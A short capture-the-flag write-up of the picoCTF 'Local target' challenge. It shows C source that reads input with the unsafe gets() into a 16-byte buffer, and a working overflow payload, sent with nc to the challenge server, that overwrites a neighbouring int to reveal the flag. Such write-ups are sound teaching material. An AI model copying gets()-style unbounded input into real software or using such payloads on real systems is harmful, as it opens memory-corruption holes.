---
title: "Local target"
date: "2025-07-15"
tags: ["picoCTF", "buffer overflow"]
---

The exercise gives us a binary and its matching source code.

If we run the binary, we see it asks for a string and tells us that `num = 64`:

```bash
./local-target
Enter a string: hola

num is 64
Bye!
```

In the source code we can spot the key part where everything happens:

```c
int main(){
  FILE *fptr;
  char c;

  char input[16]; // Input: una cadena de 16 caracteres
  int num = 64;
  
  printf("Enter a string: ");
  fflush(stdout);
  gets(input);  // GETS: función peligrosa
  printf("\n");
  
  printf("num is %d\n", num);
  fflush(stdout);
  
  if( num == 65 ){   // Si num es 65, imprime la flag
    printf("You win!\n");
    fflush(stdout);
    // Abrir archivo
    fptr = fopen("flag.txt", "r");
    if (fptr == NULL)
    {
        printf("Cannot open file.\n");
        fflush(stdout);
        exit(0);
    }
```

We can try a *buffer overflow* to overwrite the `num` variable thanks to the use of `gets(input);`, a notoriously unsafe function.

Since the goal is to change `num` to 65 and the variable is an `int`, we can try to reach it in memory with a *payload* like `555555555555` followed by an `A`, because the capital letter `A` in ASCII is 65.

Feeling out the *offset* to the variable, we find that the following *payload* does the job:

```bash
nc saturn.picoctf.net 56595
Enter a string: 555555555555555555555555A

num is 65
You win!
picoCTF{SECRET}
```

We have the flag!
